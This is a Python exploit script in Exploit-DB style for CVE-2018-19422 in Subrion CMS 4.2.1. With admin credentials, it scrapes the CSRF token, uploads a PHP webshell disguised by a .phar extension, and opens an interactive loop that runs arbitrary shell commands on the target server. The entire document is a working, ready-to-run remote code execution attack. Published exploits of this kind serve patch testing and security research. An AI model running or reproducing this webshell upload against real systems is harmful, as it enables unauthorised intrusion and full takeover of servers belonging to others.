# Exploit Title: Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated)
# Date: 17/05/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://subrion.org/
# Software Link: https://github.com/intelliants/subrion
# Version: SubrionCMS 4.2.1
# Tested on: Debian9, Debian 10 and Ubuntu 16.04
# CVE: CVE-2018-19422
# Exploit Requirements: BeautifulSoup library
# https://github.com/intelliants/subrion/issues/801

#!/usr/bin/python3

import requests
import time
import optparse
import random
import string
from bs4 import BeautifulSoup

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri http://target/panel")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Password credential to login")

options, args = parser.parse_args()

if not options.url:
    print('[+] Specify an url target')
    print('[+] Example usage: exploit.py -u http://target-uri/panel')
    print('[+] Example help usage: exploit.py -h')
    exit()

url_login = options.url
url_upload = options.url + 'uploads/read.json'
url_shell = options.url + 'uploads/'
username = options.user
password = options.passw

session = requests.Session()

def login():
    global csrfToken
    print('[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \n')
    print('[+] Trying to connect to: ' + url_login)
    try:
        get_token_request = session.get(url_login)
        soup = BeautifulSoup(get_token_request.text, 'html.parser')
        csrfToken = soup.find('input',attrs = {'name':'__st'})['value']
        print('[+] Success!')
        time.sleep(1)

        if csrfToken:
            print(f"[+] Got CSRF token: {csrfToken}")
            print("[+] Trying to log in...")

            auth_url = url_login
            auth_cookies = {"loader": "loaded"}
            auth_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/", "Upgrade-Insecure-Requests": "1"}
            auth_data = {"__st": csrfToken, "username": username, "password": password}
            auth = session.post(auth_url, headers=auth_headers, cookies=auth_cookies, data=auth_data)

            if len(auth.text) <= 7000:
                print('\n[x] Login failed... Check credentials')
                exit()
            else:
                print('[+] Login Successful!\n')
        else:
            print('[x] Failed to got CSRF token')
            exit()

    except requests.exceptions.ConnectionError as err:
        print('\n[x] Failed to Connect in: '+url_login+' ')
        print('[x] This host seems to be Down')
        exit()

    return csrfToken

def name_rnd():
    global shell_name
    print('[+] Generating random name for Webshell...')
    shell_name = ''.join((random.choice(string.ascii_lowercase) for x in range(15)))
    time.sleep(1)
    print('[+] Generated webshell name: '+shell_name+'\n')

    return shell_name

def shell_upload():
    print('[+] Trying to Upload Webshell..')
    try:
        up_url = url_upload
        up_cookies = {"INTELLI_06c8042c3d": "15ajqmku31n5e893djc8k8g7a0", "loader": "loaded"}
        up_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------6159367931540763043609390275", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/uploads/"}
        up_data = "-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n17978446266285\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"__st\"\r\n\r\n"+csrfToken+"\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\""+shell_name+".phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1621210391\r\n-----------------------------6159367931540763043609390275--\r\n"
        session.post(up_url, headers=up_headers, cookies=up_cookies, data=up_data)

    except requests.exceptions.HTTPError as conn:
        print('[x] Failed to Upload Webshell in: '+url_upload+' ')
        exit()

def code_exec():
    try:
        url_clean = url_shell.replace('/panel', '')
        req = session.get(url_clean + shell_name + '.phar?cmd=id')

        if req.status_code == 200:
            print('[+] Upload Success... Webshell path: ' + url_shell + shell_name + '.phar \n')
            while True:
                cmd = input('$ ')
                x = session.get(url_clean + shell_name + '.phar?cmd='+cmd+'')
                print(x.text)
        else:
            print('\n[x] Webshell not found... upload seems to have failed')
    except:
        print('\n[x] Failed to execute PHP code...')

login()
name_rnd()
shell_upload()
code_exec()